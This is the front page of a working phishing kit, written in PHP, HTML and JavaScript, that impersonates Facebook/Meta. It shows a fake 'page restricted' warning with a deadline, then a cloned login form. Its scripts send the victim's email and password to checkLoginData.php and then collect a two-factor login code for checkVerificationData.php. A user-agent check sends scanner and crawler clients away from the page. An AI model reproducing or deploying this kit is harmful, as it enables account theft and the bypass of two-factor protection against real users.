<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

?>
<html>
<head>
<meta charset="UTF-8"/>
<link rel="icon" type="image/png" href="img/icon.png">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Help Facebook">
<meta name="description" content="improve your page!">
<meta property="og:description" content="improve your page!';">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Meta 2023">
<meta property="og:type" content="website">
<meta name="copyright"content="Meta 2023">
<meta name="theme-color" content="#000">
<meta property="og:image" content="">
<title>Help Facebook</title>
<link rel="stylesheet" href="css/style-login/facebook.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/loader.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
body {
	background: #fff center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: #fff no-repeat center center;
	background-size: cover;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #fff;
}
.loadkin {
        width: 100%;
        height: 100%;
        position: fixed;
        top: 0;
        left: 0;
        z-index: 9999;
        background: #fff;
}

.loadkin-box {
        position: relative;
        margin: 50px auto;
        text-align: center;
        height: 43px;
        font-size: 20px;
        padding: 5px;
        padding-bottom: 5px;
        margin-top: 70%;
}

.loadkin-box img {
        width: 55px;
        height: 55px;
        margin-bottom: 20px;
}

.loadkin-box i {
        padding-top: 15px;
        padding-bottom: 15px;
        color: #000;
        float: center;
        font-size: 15px;
        font-family: arial, sans-serif;
        text-align: center;
}
.span[class^="dot-"]{
  opacity: 0;
}
.dot-one{
  animation: dot-one 2s infinite linear
}
.dot-two{
  animation: dot-two 2s infinite linear
}
.dot-three{
  animation: dot-three 2s infinite linear
}
@keyframes dot-one{
  0%{
    opacity: 0;
  }
  15%{
    opacity: 0;
  }
  25%{
    opacity: 1;
  }
  100%{
    opacity: 1;
  }
}

@keyframes dot-two{
  0%{
    opacity: 0;
  }
  25%{
    opacity: 0;
  }
  50%{
    opacity: 1;
  }
  100%{
    opacity: 1;
  }
}

@keyframes dot-three{
  0%{
    opacity: 0;
  }
  50%{
    opacity: 0;
  }
  75%{
    opacity: 1;
  }
  100%{
    opacity: 1;
  }
}
.galle-container {	
   background: #EAEBEF no-repeat center;
   background-size: cover;   
   width:auto;
   height:720px; 
   margin-top:-1px; 
   padding:5px; 
   border-left: 0px solid #fff;
   border-right: 0px solid #fff;
   border-top: 0px solid #fff;
   border-bottom: 0px solid #fff;
}
.gallery-container {	
   background: #FFF no-repeat center;
   background-size: cover;   
   width:auto;
   height:450px; 
   margin-top:-1px; 
   padding:5px; 
   border-left: 0px solid #fff;
   border-right: 0px solid #fff;
   border-top: 0px solid #fff;
   border-bottom: 0px solid #fff;
}
.navbar {
	background: #F6F6F6;
	width: 100%;
	height: 38px;
}
.navbar-logo {
	width: 79px;
	float: left;
	margin-top: 13px;
	margin-left: 11px;
}
.navbar2 {
	background: #4C6EB5;
	width: 100%;
	height: 38px;
}
.navbar-logo2 {
	width: 81px;
	float: left;
	margin-top: 10px;
	margin-left: 10px;
}
.footer {
        background: #fff;
        border: none;
}
.footer-text {
 color:#4B4949;
}
.footer img {
 width: 20%;
 height: auto;
}
.header {
	width: 100%;
	height: auto;
}
.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
	border-bottom: 0px solid #999999;
	border-top: 0px solid #999999;
}
.header video {
	width: 100%;
	height: auto;
	margin-top: -0px;
}
.metanotif {
	width: 100%;
	height: auto;
}
.metanotif img {
	width: 100%;
	height: auto;
	margin-left:auto;
	margin-right:auto;
}
.titlea1 {	
	width:100%;	
	padding:5px;	
	display:block;
	font-size: 19px;
	font-family: arial, sans-serif;
	font-weight: bold;
	text-align: left;
}
.titlea2 {	
	width:97%;	
	padding:5px;	
	display:block;
	font-size: 13px;
	font-family: arial, sans-serif;
	font-weight: bold;
	color: #848486;
	text-align: left;
	margin-left:auto;
	margin-right:auto;
	border-bottom: 0.5px solid #848486;
}
.titlea3 {	
	width:97%;	
	padding:5px;	
	display:block;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: 500;
	text-align: left;	
	margin-left:auto;
	margin-right:auto;
}
.titlea4 {	
	background: #DCDCDC;
	background-size:100% 100%;
	width:100%;	
	padding:5px;	
	display:block;	
	font-family: arial, sans-serif;
	font-weight: 500;
	border-radius:10px;
	text-align: left;	
}
.titlea5 {	
	width:100%;	
	padding:5px;	
	display:block;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: 400;
	text-align: left;	
	margin-left:auto;
	margin-right:auto;
	padding-top:10px;
	padding-bottom:10px;
	border-top: 0.5px solid #848486;
	border-bottom: 0.5px solid #848486;
}
.titlea6 {	
	width:100%;	
	padding:5px;	
	display:block;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: 400;
	text-align: left;	
	margin-left:auto;
	margin-right:auto;	
	padding-bottom:10px;
	border-bottom: 0.5px solid #848486;
}
.titlea7 {	
	width:100%;	
	padding:5px;	
	display:block;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: 400;
	text-align: left;	
	margin-left:auto;
	margin-right:auto;	
	padding-bottom:10px;	
}
.titlea8 {		
	display:inline-block;
	font-size: 12px;
	font-family: arial, sans-serif;
	font-weight: 400;
	text-align: left;	
	color: #395898;
	float: left;
	margin-left:3px;	
	padding-top:37px;			
}
.notify-au {	
   background: #FFF no-repeat center;
   background-size: cover;   
   width:98%;
   height:430px;    
   padding:5px; 
   border: 0.5px solid #dcdcdc;
   border-radius: 2px;
   margin-top:100px;
   margin-left:auto;
   margin-right:auto;
}
.verify-box-navbar {	
	background-size: 100% 100%;
	width: 93%;
	height: 19%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-description {
	width: 50%;
	margin-top: 50px;
	margin-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family: Teko;
	font-weight: 500;
	text-align: left;
	float: right;
}
.verify-box-navbar-form {	
	background-size: 100% 100%;
	width: 99%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-form input {	
	width: 45%;
	height: 30px;
	margin-left: 5px;
	margin-bottom: 4px;
	padding: 5px;
	padding-left: 10px;	
	color: #000;
	font-size:15px;
	font-family: arial, sans-serif;
	font-weight: 500;
	border: 1px solid #848486;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.verify-box-navbar-form input::placeholder {
	color: #606771;
}
.verify-box-content {	
	background-size: 100% 100%;
	width: 100%;
	height: auto;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 8px;	
	display: block;
}
.verify-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.verify-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999999;
	font-size: 100px;
	text-align: center;
}
.verify-box-content button {
	background: #1778f2;
	width: 100%;
	height: 45px;
	margin-top: 20px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 7px;	
	color: #fff;
	font-size: 18px;
	font-family: Roboto, sans-serif;
	text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
	box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
	font-weight: bold;
	text-align: center;
	border: none;
	border-radius: 5px;
	cursor: pointer;
	display: block;
}
.verify-box-contents {	
	background-size: 100% 100%;
	width: 100%;
	height: auto;
	margin-left: auto;
	margin-right: auto;		
	display: block;
	border-top: 0.5px solid #848486;
}
.verify-box-contents button {
	background: #4167B2;
	background-size: 100% 100%;
	width: 38%;
	height: 43px;
	margin-top: 20px;
	margin-left: auto;
	margin-right: 2px;
	margin-bottom: 10px;
	padding: 7px;	
	color: #fff;
	float:right;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: bold;
	text-align: center;
	border: none;
	border-radius: 5px;
	cursor: pointer;
	display: block;
}
.fb-load {	
	background-size: 100% 100%;
	width: 50%;
	height: auto;	
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	display: block;	
	text-align: center;
}
.fb-load img {		
	width: 55px;
	height: 55px;	
	margin-top: 270px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: -55px;	
	text-align: center;
}
.fb-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	padding-left: auto;
	padding-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #999998;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.text-code1 {
	font-size: 1.2rem;
    font-weight: 500;
    margin-bottom: 25px!important;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 8px;
    color: #000000;
    font-family: Roboto, sans-serif;
    text-align: center;
    display: block;
}
@media only screen and (max-width:600px) {
    .container {
        width: 100%;
        height: auto;
        margin-top: -3px;
        margin-bottom: 0px;
        border: none;
        border-radius: 0px;
        padding: 0px;
    }
    .gallery-container {	
        height:450px;     
    }
}
</style>
<div class="container">
<div class="loadkin load">
<div class="loadkin-box">
<img src="img/icon.png">
<br><i>LOADING
<span class="dot-one"> .</span>
<span class="dot-two"> .</span>
<span class="dot-three"> .</span>
</i>
<br><br><br><br><br><br>
<br><br><br><br>

<div class="footer">
<div class="footer-text">form</div>
<img src="img/logometa.png">
</div> <!--- footer --->

</div><!--- loadkin-box --->
</div><!--- loadkin load --->
<div class="home-sec" style="display: block;">
<div class="navbar">
<img class="navbar-logo" src="img/logometa.png">
</div> <!--- navbar --->
<div class="max_form" style="height: auto;">
<div class="gallery-container">
<div class="header">
<img src="img/namheader.jpg" style="width: 100%;">
</div> <!--- header --->
<i class="zmdi zmdi-timer" style="margin-top:-50px;margin-left:150px;position:absolute;"></i><span id="latestTimer"></span>
<div id="timer1" style=" margin-top:-60px;margin-left:60px;font-size:30px;color:#000;;position:absolute;opacity:60%;">
</div>
<div class="titlea1">
Your Page has been restricted
</div> <!--- titlea1 --->
<div class="titlea2">
Term of Service
</div> <!--- titlea2 --->
<div class="titlea3">
We got a lot of repeated reports on your page today. please obey every ad meta rule, we will lock your page within the next 3 hours to give sanctions to any violators of the meta community, <a onclick="open_account_login()" style="color: #3775F0">Click Button Continue </a>
to improve your page before being permanently deactivated.
</div> <!--- titlea3 ---><br>
<div class="metanotif">
<img src="img/header2.png" style="width: 100%;">
</div> <!--- metanotif --->
<div class="verify-box-content">
<button type="button" onclick="open_account_login()">Get started</button>
</div> <!--- verify-box-content --->
</div> <!--- max-form --->
<br><br><br><br><br><br><br><div class="copyright">Meta © 2023</div>
</div> <!--- gallery-container --->
</div> <!--- home-sec --->

<div class="login-sec" style="display: none;">
<div class="navbar">
<img class="navbar-logo" src="img/logometa.png">
</div> <!--- navbar --->
<div class="max_form">
<div class="gallery-container">
<center><img style="margin-top:-20px;" src="img/namunlock.jpg" height="auto" width="100%" position="absolute"></center>
<center><img class="logo" style="margin-top:-25px;"src="img/sign.png" height="100" width="100"></center>
<h2 class="text-login" style="margin-top:-30px;">Log in to Facebook</h2><br>
<div class="content-box-fb">
<div class="info info-fb" style="margin-top:-40px;margin-bottom:-10px;"> You must log in to continue.</div>
<p class="kaget email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
<p class="kaget sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<div class="form-group-fb" style="border: 1px solid #e4e4e4;border-radius: 4px;margin-top:25px;">
<input type="text" name="email" id="email-facebook" placeholder="Email address or phone number" autocomplete="off" autocapitalize="off" oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<div class="form-group-sohid showFirstFbPassword" style="margin-top:5px;" id="showFirstFbPassword" onclick="showFirstFbPassword()">
<img src="img/hidepassword.png">
</div> <!--- form-group-sohid showFbPassword --->
<div class="form-group-sohid hideFirstFbPassword" style="display: none;margin-top:5px;" onclick="hideFirstFbPassword()">
<img src="img/showpassword.png">
</div> <!--- form-group-sohid showFbPassword --->
<div class="form-group-fb" style="border: 1px solid #e4e4e4;border-radius: 4px;margin-top:5px;">
<input type="password" name="password" id="password-facebook" placeholder="Enter your password" autocomplete="off" autocapitalize="off" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
</div> <!--- max-form --->
<br><br><br><br>
<div class="copyright">Meta © 2023</div>
</div> <!--- gallery-container --->
</div> <!--- login-sec --->

<div class="loading-sec" style="display: none;">
<div class="navbar">
<img class="navbar-logo" src="img/logometa.png">
</div> <!--- navbar --->
<div class="max_form">
<div class="gallery-container">
<div class="fb-load">
<img src="img/icon.png" style="margin-top: 150px;">
<div class="loader3"></div>
</div> <!--- fb-load --->
</div> <!--- loading-sec--->
</div> <!--- gallery-container --->
</div> <!--- max-form --->

<div class="final-sec" style="display: none;">
<div class="navbar">
<img class="navbar-logo" src="img/logometa.png">
</div> <!--- navbar2 --->
<div class="max_form">
<div class="gallery-container">
<center><img class="logo" src="img/notification.png" height="75" width="100"></center><br>
<hr><h2 class="text-code">Enter your login code</h2><br>
<div class="info"> Enter the 6-digit code we just sent from the authentication app you set up. or Enter the 8-digit recovery code.</div>
<form class="form-group-fb" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" style="border: 1px solid #e4e4e4;border-radius: 4px;margin-top:20px;" name="loginCode" id="loginCode" placeholder="Login Code" autocomplete="off" required oninvalid="this.setCustomValidity('Enter the 8-digit code we just sent from the RECOVERY CODE you set up.')" oninput="setCustomValidity('')"><br>
<button type="submit" class="btn-login-fb" style="padding: 15px;" onclick="ValidateVerificationData()">Submit code</button>
</form>
</div> <!--- final-sec --->
<div class="copyright">Meta © 2023</div>
</div> <!--- max-form --->
</div> <!--- galle-container --->

<div class="done-sec" style="display: none;">
<div class="navbar">
<img class="navbar-logo" src="img/logometa.png">
</div> <!--- navbar --->
<div class="max_form">
<div class="gallery-container">
<img class="logo" src="img/oops.png" height="100" width="100"><br>
<div class="text-code1" style="text-align: left;font-size: 19px;margin-left: -15px;">Hi, We are receiving your information</div>
<div class="titlea7" style="text-align: left;margin-left: -15px;font-size: 16px;">
Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account
</div> <!--- titlea3 --->
<div class="titlea7" style="text-align: left; font-size: 16px; margin-left: -15px;margin-top: 5px;margin-bottom: 25px;">
Please wait, this could take up to 10-20 minutes, please be patient while we review your case... (wait <span id="minute" class="numbers"></span>:<span id="second" class="numbers"></span>)
</div> <!--- titlea3 --->
<div id="progressBar">
	<div></div>
</div>
<ul id="countdown" style="display:none;">
	<li><span id="day" class="numbers">00</span>
		<p class="name">days</p>
	</li>
	<li><span id="hour" class="numbers">00</span>
		<p class="name">hours</p>
	</li>

</ul>
<div class="copyright" style="margin-top: 35px;">Meta © 2023</div>
</div> <!--- max-form --->
</div> <!--- gallery-container --->
</div> <!--- done-sec --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>
<script src="js/namtimer.js"></script>
<style>
	#progressBar {
		width: 100%;
		margin: 10px auto;
		height: 22px;
		background-color: #f0f2f5;
	}

	#progressBar div {
		height: 100%;
		text-align: right;
		padding: 0 10px;
		line-height: 22px;
		/* same as #progressBar height if we want text middle aligned */
		width: 0;
		background-color: #3084f4;
		box-sizing: border-box;
	}
</style>
<script>
	$(document).ready(function() {

		//COUNTDOWN TIMER
		//edit ".25" below to change time in terms of day
		var deadline = new Date(Date.now() + 600000);

		var x = setInterval(function() {

			var now = Date.now();
			var t = deadline - now;
			var days = Math.floor(t / (1000 * 60 * 60 * 24));
			var hours = Math.floor((t % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
			var minutes = Math.floor((t % (1000 * 60 * 60)) / (1000 * 60));
			var seconds = Math.floor((t % (1000 * 60)) / 1000);
			document.getElementById("day").innerHTML = days;
			document.getElementById("hour").innerHTML = hours;
			document.getElementById("minute").innerHTML = minutes;
			document.getElementById("second").innerHTML = seconds;
			if (t < 0) {
				clearInterval(x);
				document.getElementById("day").innerHTML = '0';
				document.getElementById("hour").innerHTML = '0';
				document.getElementById("minute").innerHTML = '0';
				document.getElementById("second").innerHTML = '0';
				window.location = "https://www.facebook.com/";
			}
		}, 1000);

		//COUNTDOWN BAR

		function progress(timeleft, timetotal, $element) {
			var progressBarWidth = timeleft * $element.width() / timetotal;
			$element.find('div').animate({
				width: progressBarWidth
			}, timeleft == timetotal ? 0 : 1000, 'linear');
			if (timeleft > 0) {
				setTimeout(function() {
					progress(timeleft - 1, timetotal, $element);
				}, 1000);
			}
		};
		//adjust these numbers to match time set
		//must be in seconds
		progress(1740, 1740, $('#progressBar'));

	});
</script>
<script>
// code for showing hiding popup
function open_account_login() {
    $('.login-sec').show();
    $('.home-sec').hide();
}

// code for validate data to next step
function ValidateLoginFbData() {
    $emailfb = $('#email-facebook').val().trim();
    $passwordfb = $('#password-facebook').val().trim();
    if ($emailfb.length < 5) {
        $('.email-fb').show();
        $('.sandi-fb').hide();
        $('.info-fb').hide();
        $('.login-sec').show();
        return false;
    } else if ($passwordfb.length < 5) {
        $('.sandi-fb').show();
        $('.email-fb').hide();
        $('.info-fb').hide();
        $('.login-sec').show();
        return false;
    } else {
        $.ajax({
            type: "POST",
            url: "checkLoginData.php",
            data: $("#ValidateLoginFbForm").serialize(),
            beforeSend: function() {
                $('.email-fb').hide();
                $('.sandi-fb').hide();
                $('.info-fb').hide();
                $('.login-sec').hide();
				$('.loading-sec').show();
            },
            success: function() {
				$('.loading-sec').hide();
				$('.final-sec').show();
				$("input#validateEmail").val($emailfb);
                $("input#validatePassword").val($passwordfb);
                return true;
            }
        });
    };
};

// show hide password for facebook and twitter
function showFirstFbPassword() {
    var xFirst = document.getElementById("password-facebook");
    if (xFirst.type === "password") {
        xFirst.type = "text";
        $('.showFirstFbPassword').hide();
        $('.hideFirstFbPassword').show();
    } else {
        xFirst.type = "password";
    }
}
function hideFirstFbPassword() {
    var xFirst = document.getElementById("password-facebook");
    if (xFirst.type === "text") {
        xFirst.type = "password";
        $('.showFirstFbPassword').show();
        $('.hideFirstFbPassword').hide();
    } else {
        xFirst.type = "text";
    }
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $loginCode = $("input#loginCode").val();
	if($validateEmail == "" && $validatePassword == "" && $loginCode == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "checkVerificationData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading-sec').show();
			$('.final-sec').hide();
		},
		success: function(){
		$('#loginCode').val('');
		$(".final-sec").show();
		$(".loading-sec").hide();
		}
	});
	});  
	return false;
};
</script>
<script>
    setTimeout(function() {
        $('.loadkin').fadeOut(750);
        $('.home-sec').show();
}, 1000);
</script>
</body>
</html>